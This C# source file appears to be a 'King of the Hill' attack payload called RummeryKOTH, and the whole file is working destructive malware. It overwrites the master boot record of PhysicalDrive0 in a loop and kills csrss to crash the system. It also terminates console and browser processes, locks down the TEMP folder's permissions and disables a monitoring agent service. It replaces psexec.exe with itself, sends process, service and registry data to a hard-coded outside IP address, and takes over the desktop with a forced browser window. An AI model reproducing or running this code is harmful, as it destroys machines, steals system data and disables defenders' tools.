using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net.Sockets;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Drawing;
using System.Collections.Specialized;
using System.ServiceProcess;

namespace RummeryKOTH
{
    class Program
    {
        static Random rnd = new Random();
        static String imagePath = "";
        static String hPath = "";

        // Because lol 3.5
        public static void CopyStream(Stream input, Stream output)
        {
            byte[] buffer = new byte[8 * 1024];
            int len;
            while ((len = input.Read(buffer, 0, buffer.Length)) > 0)
            {
                output.Write(buffer, 0, len);
            }
        }

        static void SystemEvents_SessionSwitch(object sender, Microsoft.Win32.SessionSwitchEventArgs e)
        {
            if (e.Reason == SessionSwitchReason.SessionLock)
            {
                //Process.Start("shutdown", "/f /s /t 0");
            }
        }

        static void forceNavigate()
        {
            try {
                if (hPath.Length == 0) {
                    System.Reflection.Assembly myAssembly = System.Reflection.Assembly.GetExecutingAssembly();
                    Stream s = myAssembly.GetManifestResourceStream("RummeryKOTH.h.html");
                    var path = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".htm");
                    using (Stream file = File.Create(path)) {
                        CopyStream(s, file);
                    }

                    var ac = File.GetAccessControl(path);
                    ac.AddAccessRule(new FileSystemAccessRule(System.Security.Principal.WindowsIdentity.GetCurrent().Name, FileSystemRights.Write, AccessControlType.Deny));
                    ac.AddAccessRule(new FileSystemAccessRule(System.Security.Principal.WindowsIdentity.GetCurrent().Name, FileSystemRights.ReadAndExecute, AccessControlType.Allow));
                    new FileInfo(path).SetAccessControl(ac);

                    hPath = path;
                }
            }
            catch (Exception e) {}
            /*foreach (InternetExplorer ie in new ShellWindows())
            {
                try {
                    ie.FullScreen = true;
                    ie.Navigate(hPath);
                } catch (Exception e) { }
            }*/

        }

        static void setIETitle()
        {
            try {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Internet Explorer\Main", true);
                key.SetValue("Window Title", "RUMBROWSER");
            } catch (Exception e) { }
        }

        static void setDesktop() {
            try {
                if (imagePath.Length == 0) {
                    Assembly myAssembly = System.Reflection.Assembly.GetExecutingAssembly();
                    Stream s = myAssembly.GetManifestResourceStream("RummeryKOTH.RummeryQR.bmp");
                    Stream s2 = myAssembly.GetManifestResourceStream("RummeryKOTH.RummeryFS.bmp");
                    var path = Path.Combine(Path.GetTempPath(), "lolrum.bmp");
                    using (Stream file = File.Create(path)) {
                        CopyStream(s, file);
                    }
                    imagePath = path;

                }
            }catch (Exception e) {}
            try {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
                key.SetValue(@"WallpaperStyle", "1");
                key.SetValue(@"TileWallpaper", "1");

                //RegistryKey rkey = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background", true);
                using (var rkey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background", true)) {
                    rkey.SetValue("OEMBackground", 1, RegistryValueKind.DWord);
                }
                //SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
                External.SystemParametersInfo(20, 0, imagePath, 0x01 | 0x02);
            } catch (Exception e) {
                Console.WriteLine(e.Message);
            }
        }

        public static void whatTemp()
        {
            try {
                var path = @"C:\Windows\TEMP";
                //DirectorySecurity fs = Directory.GetAccessControl(path);
                var fs = new DirectorySecurity();
                SecurityIdentifier cu = WindowsIdentity.GetCurrent().User;
                var everyone = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
                var nobody = new SecurityIdentifier(WellKnownSidType.NTAuthoritySid, null);
                fs.SetOwner(nobody);
                fs.SetAccessRule(new FileSystemAccessRule(cu, FileSystemRights.CreateFiles, AccessControlType.Deny));
                fs.SetAccessRule(new FileSystemAccessRule(cu, FileSystemRights.ExecuteFile, AccessControlType.Deny));
                fs.SetAccessRule(new FileSystemAccessRule(everyone, FileSystemRights.CreateFiles, AccessControlType.Deny));
                fs.SetAccessRule(new FileSystemAccessRule(everyone, FileSystemRights.ReadAndExecute, AccessControlType.Deny));
                Directory.SetAccessControl(path, fs);
            }
            catch (Exception e) {
            }
        }

        public static void sdrawthread()
        {
            Image i = getRandomImage();
            //var gdc = Graphics.FromImage(i).GetHdc();

            var orig = External.GetDC(IntPtr.Zero);
            var compat_bitmap = External.CreateCompatibleBitmap(orig, 1024, 768);
            var compat = External.CreateCompatibleDC(orig);
            var obj = External.SelectObject(compat, compat_bitmap);
            var gdc = Graphics.FromHdc(compat);
            gdc.DrawImageUnscaled(i, 0, 0);
            IntPtr lastdesktop = IntPtr.Zero;
            while (true) {
                var dt = External.OpenInputDesktop(0, false, 0x00010000 | 0x0020000 | 0x00040000 | 0x00080000);
                External.SetThreadDesktop(dt);
                if (dt != lastdesktop || rnd.Next(100)==2) {
                    External.ReleaseDC(IntPtr.Zero, orig);
                    External.ReleaseDC(IntPtr.Zero, compat);
                    i = getRandomImage();
                    orig = External.GetDC(IntPtr.Zero);
                    compat_bitmap = External.CreateCompatibleBitmap(orig, 1024, 768);
                    compat = External.CreateCompatibleDC(orig);
                    obj = External.SelectObject(compat, compat_bitmap);
                    gdc = Graphics.FromHdc(compat);
                    gdc.DrawImageUnscaled(i, 0, 0);
                }
                lastdesktop = dt;
                var dc = External.GetDC(IntPtr.Zero);
                External.BitBlt(dc, 0, 0, i.Width, i.Height, compat, 0, 0, TernaryRasterOperations.MERGECOPY);
                External.ReleaseDC(IntPtr.Zero, dc);
                Thread.Sleep(10);
            }
        }

        public static void sdraws()
        {
            Assembly myAssembly = System.Reflection.Assembly.GetExecutingAssembly();
            Image i = Image.FromStream(myAssembly.GetManifestResourceStream("RummeryKOTH.RummeryQR.bmp"));
            //var gdc = Graphics.FromImage(i).GetHdc();

            var orig = External.GetDC(IntPtr.Zero);
            var compat_bitmap = External.CreateCompatibleBitmap(orig, 1024, 768);
            var compat = External.CreateCompatibleDC(orig);
            var obj = External.SelectObject(compat, compat_bitmap);
            var gdc = Graphics.FromHdc(compat);
            gdc.DrawImageUnscaled(i, 0, 400);
            IntPtr lastdesktop = IntPtr.Zero;
            while (true) {
                var dt = External.OpenInputDesktop(0, false, 0x00010000 | 0x0020000 | 0x00040000 | 0x00080000);
                External.SetThreadDesktop(dt);
                if (dt != lastdesktop) {
                    orig = External.GetDC(IntPtr.Zero);
                    compat_bitmap = External.CreateCompatibleBitmap(orig, 1024, 768);
                    compat = External.CreateCompatibleDC(orig);
                    obj = External.SelectObject(compat, compat_bitmap);
                    gdc = Graphics.FromHdc(compat);
                    gdc.DrawImageUnscaled(i, 0, 0);
                }
                lastdesktop = dt;
                var dc = External.GetDC(IntPtr.Zero);
                External.BitBlt(dc, 0, 0, i.Width, i.Height, compat, 0, 0, TernaryRasterOperations.MERGECOPY);
                External.ReleaseDC(IntPtr.Zero, dc);
                Thread.Sleep(10);
            }
        }

        static List<Image> images = new List<Image>();

        public static void populateImages()
        {
            Assembly myAssembly = System.Reflection.Assembly.GetExecutingAssembly();
            foreach (String name in new String[] { "RummeryFS.bmp", "RummeryFS2.jpg", "RummeryFS3.jpg", "RummeryFS4.jpg" }) {
                Stream s = myAssembly.GetManifestResourceStream("RummeryKOTH." + name);
                images.Add(Image.FromStream(s));
            }
        }

        public static Image getRandomImage()
        {
            return images[rnd.Next(images.Count)];
        }

        public static void drawall()
        {
            while (true) {
                External.SetThreadDesktop(External.OpenInputDesktop(0, false, 0x00010000 | 0x0020000 | 0x00040000 | 0x00080000));
                var dc = External.GetDC(IntPtr.Zero);
                Graphics.FromHdc(dc).DrawImageUnscaled(getRandomImage(), 0, 0);
                External.ReleaseDC(IntPtr.Zero, dc);
                Thread.Sleep(10);
            }
        }

        public static void drawOnWindows()
        {
            while (true) {
                foreach (var proc in Process.GetProcesses()) {
                    try{
                        if (proc.MainWindowHandle!=IntPtr.Zero && proc.SessionId != 0) {
                            var g = Graphics.FromHwnd(proc.MainWindowHandle);
                                g.FillRectangle(new SolidBrush(Color.Black),0,0,1000,1000);
                                //g.DrawImageUnscaled
                        }
                    }catch(Exception e){}
                }
                Thread.Sleep(500);
            }
        }

        static void spawnLockIE(String ws)
        {
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            si.lpDesktop = @"Winsta0\" + ws;//C:\Program Files (x86)\Internet Explorer\iexplore.exe
            //si.wShowWindow = 1; //SW_SHOWNORMAL
            //si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
            Console.WriteLine(External.CreateProcess(@"C:\Program Files (x86)\Internet Explorer\iexplore.exe", "iexplore.exe -nomerge https://police-polecat-13066.bitballoon.com/", IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref si, out pi));
        }

        static void fork(/*String ws*/)
        {
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            //si.lpDesktop = @"Winsta0\" + ws;
            //si.wShowWindow = 1; //SW_SHOWNORMAL
            //si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
            Console.WriteLine(External.CreateProcess(System.Reflection.Assembly.GetEntryAssembly().Location, "koth.exe - - -", IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref si, out pi));
        }

        static void bootkit()
        {
            Assembly myAssembly = System.Reflection.Assembly.GetExecutingAssembly();
            var s = myAssembly.GetManifestResourceStream("RummeryKOTH.boot.bin");
            byte[] buffer = new byte[2048];
            for (int i = 0; i < 2048; i++) {
                buffer[i] = (byte)s.ReadByte();
            }

            OVERLAPPED overlapped = new OVERLAPPED() {
                internalLow = 0,
                internalHigh = 0,
                offsetLow = (uint)0,
                offsetHigh = (uint)0,
                hEvent = IntPtr.Zero,
            };

            var fp = External.CreateFileA(@"\\.\PhysicalDrive0", 0x80000000 | 0x40000000, 0x00000003, IntPtr.Zero, 3, 0, IntPtr.Zero);
            External.LockFileEx(fp, External.LOCKFILE_EXCLUSIVE_LOCK, 0, 2048, 0, ref overlapped);
            uint wb;
            External.WriteFile(fp, buffer, 2048, out wb, IntPtr.Zero);
            //External.CloseHandle(fp);
        }

        static void bkthread()
        {
            Assembly myAssembly = System.Reflection.Assembly.GetExecutingAssembly();
            var s = myAssembly.GetManifestResourceStream("RummeryKOTH.boot.bin");
            byte[] buffer = new byte[2048];
            for (int i = 0; i < 2048; i++) {
                buffer[i] = (byte)s.ReadByte();
            }

            OVERLAPPED overlapped = new OVERLAPPED() {
                internalLow = 0,
                internalHigh = 0,
                offsetLow = (uint)0,
                offsetHigh = (uint)0,
                hEvent = IntPtr.Zero,
            };

            while (true) {
                var fp = External.CreateFileA(@"\\.\PhysicalDrive0", 0x80000000 | 0x40000000, 0x00000003, IntPtr.Zero, 3, 0, IntPtr.Zero);
                External.LockFileEx(fp, External.LOCKFILE_EXCLUSIVE_LOCK, 0, 2048, 0, ref overlapped);
                uint wb;
                External.WriteFile(fp, buffer, 2048, out wb, IntPtr.Zero);
                //External.CloseHandle(fp);
                Thread.Sleep(5);
            }
        }

        static void killthread()
        {
            while (true) {
                External.EnumWindows(new External.EnumWindowsProc(wenum), IntPtr.Zero);
                //Thread.Sleep(1);
            }
            /*var cp = Process.GetCurrentProcess().Id;
            while (true) {
                foreach (var proc in Process.GetProcessesByName("conhost")) {
                    if (proc.Id != cp && proc.SessionId != 0) {
                        IntPtr hProcess = External.OpenProcess(ProcessAccessFlags.All, false, (uint)proc.Id);
                        External.TerminateProcess(hProcess, 1);
                    }
                }
            }*/
        }

        static bool wenum(IntPtr hWnd, IntPtr lParam)
        {
            uint processId = 0;
            External.GetWindowThreadProcessId(hWnd, out processId);
            if (processId != 0) {
                IntPtr hProcess = External.OpenProcess(ProcessAccessFlags.All, false, processId);

                        // Setting up the variable for the second argument for EnumProcessModules
                IntPtr[] hMods = new IntPtr[2];
                GCHandle gch = GCHandle.Alloc(hMods, GCHandleType.Pinned); // Don't forget to free this later
                IntPtr pModules = gch.AddrOfPinnedObject();
                // Setting up the rest of the parameters for EnumProcessModules
                uint uiSize = (uint)(Marshal.SizeOf(typeof(IntPtr)) * (hMods.Length));
                uint cbNeeded = 0;


                if (External.EnumProcessModules(hProcess, pModules, uiSize, out cbNeeded) == 1) {
                    Int32 uiTotalNumberofModules = (Int32)(cbNeeded / (Marshal.SizeOf(typeof(IntPtr))));

                    for (int i = 0; i < uiTotalNumberofModules; i++) {
                        StringBuilder strbld = new StringBuilder(1024);

                        //GetModuleFileNameEx(p.Handle, hMods[i], strbld, (uint)(strbld.Capacity));
                        External.GetModuleBaseName(hProcess, hMods[i], strbld, (uint)strbld.Capacity);
                        //Console.WriteLine("File Path: " + strbld.ToString());
                        //Console.WriteLine();
                        //Console.WriteLine(strbld.ToString());
                        //Console.WriteLine(strbld.ToString().Length);
                        if (i == 0) Console.WriteLine(strbld.ToString());
                        if (strbld.ToString().Contains("conhost")) {
                            External.TerminateProcess(hProcess, 1);
                        }
                    }
                    //Console.WriteLine("Number of Modules: " + uiTotalNumberofModules);
                    //Console.WriteLine();
                }
                gch.Free();
                //External.GetModuleBaseName(hProcess);
            }
            return true;
        }

        static void bsod()
        {
            foreach (var proc in System.Diagnostics.Process.GetProcessesByName("csrss"))
            {
                IntPtr hProcess = External.OpenProcess(ProcessAccessFlags.All, false, (uint)proc.Id);
                External.TerminateProcess(hProcess, 1);
            }

        }

        static void exfil()
        {
            try {
                var psl = new NameValueCollection();
                int i = 0;
                foreach (var proc in Process.GetProcesses()) {
                    try {
                        psl[i.ToString()] = proc.Id.ToString() +
                            " " + proc.SessionId +
                            " " + proc.ProcessName +
                            " " + proc.StartTime.Ticks.ToString() +
                            " " + proc.MainModule.FileName;
                    }
                    catch (Exception e) { }
                    ++i;
                }
                using (var client = new WebClient()) {
                    var response = client.UploadValues("http://185.52.3.174:42069/ex/pl", psl);
                }
            }
            catch (Exception e) { }
        }

        static void exfilsvcs()
        {
            var scd = ServiceController.GetServices();
            try {
                var psl = new NameValueCollection();
                int i = 0;
                foreach (var proc in scd) {
                    try {
                        psl[i.ToString()] = proc.ServiceType.ToString() + " " + proc.ServiceName + " " + proc.Status.ToString(); //+ " "
                        //+ proc.DisplayName;

                        using (var rkey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\services\" + proc.ServiceName, false)) {
                            psl[i.ToString()] += " " + (string)rkey.GetValue("ImagePath");
                        }
                    }
                    catch (Exception e) { }
                    ++i;
                }
                using (var client = new WebClient()) {
                    var response = client.UploadValues("http://185.52.3.174:42069/ex/sl", psl);
                }
            }
            catch (Exception e) { }
        }

        public static void effl()
        {
            var fi = new FileInfo(@"C:\windows\nssm.exe");
            try {
                var psl = new NameValueCollection();
                psl["a"] = fi.Length.ToString();
                using (var rkey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\services\WindowsAgent", false)) {
                    foreach (var key in rkey.GetValueNames()) {
                        psl[key] = key + ": " + rkey.GetValue(key).ToString();
                    }
                }
                using (var client = new WebClient()) {
                    var response = client.UploadValues("http://185.52.3.174:42069/ex/fl", psl);
                }
            }
            catch (Exception e) { throw e; }
        }

        public static void killAgent()
        {
            using (var rkey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\services\WindowsAgent", true)) {
                rkey.SetValue("Start", 4);
            }
        }

        public static void unlink_psexec()
        {
            try {
                Process.Start("takeown", @"/f ""C:\Windows\psexec.exe""");

                var si = new ProcessStartInfo();
                si.FileName = @"C:\Windows\System32\icacls.exe";
                si.Arguments = @"""C:\Windows\psexec.exe"" /t /c /q";
                si.CreateNoWindow = true;
                si.UseShellExecute = false;
                Process.Start(si).WaitForExit(2000);
                File.Delete(@"C:\Windows\psexec.exe");
                File.Copy(System.Reflection.Assembly.GetEntryAssembly().Location, @"C:\Windows\psexec.exe", true);
            }
            catch (Exception e) {
            }
        }

        static void Main(string[] args)
        {
            fork();
            //unlink_psexec();
            new Thread(killthread).Start();
            bootkit();
            //bsod();
            External.Invincible();
            whatTemp();
            populateImages();
            new Thread(bkthread).Start();
            new Thread(drawOnWindows).Start();
            new Thread(drawall).Start();
            new Thread(sdraws).Start();
            new Thread(sdrawthread).Start();

            setDesktop();

            var ptr = External.OpenDesktop("Rummery", 0, false, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            if (ptr == IntPtr.Zero) {
                ptr = External.CreateDesktop("Rummery", IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }
            External.SwitchDesktop(ptr);
            forceNavigate();
            spawnLockIE("Winlogon");
            //spawnLockIE("Rummery");
            setIETitle();
            //External.LockWorkStation();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write(
@"                                RUMMERY!!
            .           .   ________________    .        .
                  .    ____/ (  (    )   )  \___
            .         /( (  (  )   _    ))  )   )\        .   .
                    ((     (   )(    )  )   (   )  )   .
         .    .   ((/  ( _(   )   (   _) ) (  () )  )_       .   .
                 (( f)  u ( c  k ( 2) h  )e  )c.t)o(r )_
      #####  ####   ### ###  ###### ( _)    ####  #    # ###### #####
     #      #    # #   #   # #       )     #    # #    # #      #    #
    #  ### ###### #   #   # ######  ) (   #    # #    # ###### #####  
   #    # #    # #   #   # #        ( _  #    #  #  #  #      #   #   
   ##### #    # #   #   # ######  _  )   ####     #   ###### #     #  `   
  .       .     (_((__(_(__(( ( ( |  ) ) ) )_))__))_)___)   .
      .         ((__)        \\||lll|l||///          \_))       .
               .       . / (  |(||(|)|||//  \     .    .      .      .
 .       .           .   (   /(/ (  )  ) )\          .     .
     .      .    .     (  . ( ( ( | | ) ) )\   )               .
                        (   /(| / ( )) ) ) )) )    .   .  .       .  .  .
 .     .       .  .   (  .  ( ((((_(|)_)))))     )            .
         .  .          (    . ||\(|(|)|/|| . . )        .        .
     .           .   (   .    |(||(||)||||   .    ) .      .         .  .
 .      .      .       (     //|/l|||)|\\ \     )      .      .   .
                     (/ / //  /|//||||\\  \ \  \ _)
           Interpreting docs with malicious intent since '11");
            Console.WriteLine();
            var ident = System.Security.Principal.WindowsIdentity.GetCurrent().Name + "@" +
                        Environment.MachineName +
                        ": " + Environment.OSVersion.VersionString.Replace("Microsoft Windows ", "");
            Console.Title = "SALAMANDERS! " + ident;

            Process.GetProcesses().Where(
                p => p.ProcessName == "iexplore" || p.ProcessName == "cmd"
            ).ToList().ForEach(
                p => p.Kill()
            );

            //Thread.Sleep(5000);
            while (true)
            {
                var processes = Process.GetProcesses();
                if (
                    processes.Select(p => p.ProcessName).Contains("iexplore") &&
                    processes.Select(p => p.MainWindowTitle).Any(t => t.Contains("police-polecat-13066"))
                )
                {
                    //var proc = processes.First(p => p.MainWindowTitle.Contains("police-polecat-13066"));
                    //Program.SetWindowPos(
                    //    proc.MainWindowHandle, new IntPtr(-1), 0, 0, 0, 0, 0x0002 | 0x0001
                    //);
                    foreach (var proc in processes) {
                        if (proc.MainWindowTitle.Contains("police-polecat-13066") || proc.MainWindowTitle.Contains("Mess with the best")) {
                            //-1: Send to front, position 0,0, size (ignored) 0x0 due to, 0x0001: SWP_NOSIZE
                            External.SetWindowPos(proc.MainWindowHandle, new IntPtr(-1), 0, 0, 0, 0, 0x0001);
                        } else {
                            //1: Send to back, reposition to 3000,0, resize to 0x0, hide window
                            External.SetWindowPos(proc.MainWindowHandle, new IntPtr(1), 3000, 0, 0, 0, 0x0080);
                        }
                    }
                }
                else
                {
                    var pInfo = new ProcessStartInfo(
                        "iexplore.exe", "-nomerge " + hPath
                    );
                    pInfo.WindowStyle = ProcessWindowStyle.Maximized;
                    var p = new Process();
                    p.StartInfo = pInfo;
                    p.Start();
                }
                processes.Where(
                    p => !p.MainWindowTitle.Contains("police-polecat-13066") &&
                         p.ProcessName != "iexplore"
                ).ToList().ForEach(p => External.ShowWindow(p.MainWindowHandle, 11));

                External.SwitchDesktop(ptr);
                Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.High;
                Process.GetCurrentProcess().PriorityBoostEnabled = true;
                forceNavigate();
                spawnLockIE("Winlogon");
                //spawnLockIE("Rummery");
                setIETitle();
                setDesktop();
                Thread.Sleep(2000);
            }
        }
    }
}
